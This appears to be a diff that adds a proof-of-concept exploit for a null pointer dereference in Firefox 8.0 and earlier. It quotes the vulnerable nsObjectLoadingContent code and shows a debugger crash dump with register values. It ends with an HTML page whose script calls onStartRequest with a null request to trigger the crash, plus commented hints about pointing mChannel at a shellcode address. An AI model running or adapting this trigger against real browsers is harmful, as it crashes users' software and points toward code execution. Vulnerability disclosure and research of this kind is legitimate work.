@@ -1,0 +1,59 @@
+# Firefox <= 8.0 null pointer dereference PoC exploit
+# Author: 0in (Maksymilian Motyl)
+# Tested on Firefox 8.0/4.0 on windows and Firefox 7.1 on Linux
+# Lets see in code:
+# $ cat ./mozilla-release/content/base/src/nsObjectLoadingContent.cpp
+
+NS_IMETHODIMP nsObjectLoadingContent::OnStartRequest(nsIRequest *aRequest,
+                                       nsISupports *aContext)
+{
+  if (aRequest != mChannel) { // our pointer is checked there, mChannel is null. I think maybe some magick in js can help there
+    return NS_BINDING_ABORTED;
+  }
+  AutoNotifier notifier(this, PR_TRUE);
+
+  if (!IsSuccessfulRequest(aRequest)) { // go
+
+
+//----------------------------------------------------------------------------------
+PRBool nsObjectLoadingContent::IsSuccessfulRequest(nsIRequest* aRequest)
+{
+  nsresult status;
+  nsresult rv = aRequest->GetStatus(&status); // Code execution is here.
+
+// ---------------------------------------------------------------------------------
+
+
+DUMP:
+  014E7A28   8B7D 08          MOV EDI,DWORD PTR SS:[EBP+8]
+  014E7A2B   8B07             MOV EAX,DWORD PTR DS:[EDI] ; access violation when reading 0x00000000
+  014E7A2D   8D4D FC          LEA ECX,DWORD PTR SS:[EBP-4]
+  014E7A30   51               PUSH ECX
+  014E7A31   57               PUSH EDI
+  014E7A32   FF50 14          CALL DWORD PTR DS:[EAX+14]
+
+  EAX 0012BFC0
+  ECX 00080000
+  EDX 00080000
+  EBX 03A199E8
+  ESP 0012BF44
+  EBP 0012BF54
+  ESI 03A199C0
+  EDI 00000000
+  EIP 014E7A2B xul.014E7A2B
+
+$ cat 2011_powrot_komuny.html
+<html>
+<body>
+
+<object id="dupa">
+<script>
+RIINDC=document.getElementById("dupa");
+RIINDC.QueryInterface(Components.interfaces.nsIRequestObserver);
+//RIINDC.mchannel=SHELLCODE_ADDR
+RIINDC.onStartRequest(null,RIINDC.QueryInterface(Components.interfaces.nsISupports));
+//RIINDC.onStartRequest(RIINDC.mchannel,DWCJWL.QueryInterface(Components.interfaces.nsISupports));
+
+</script>
+</body>
+</html>
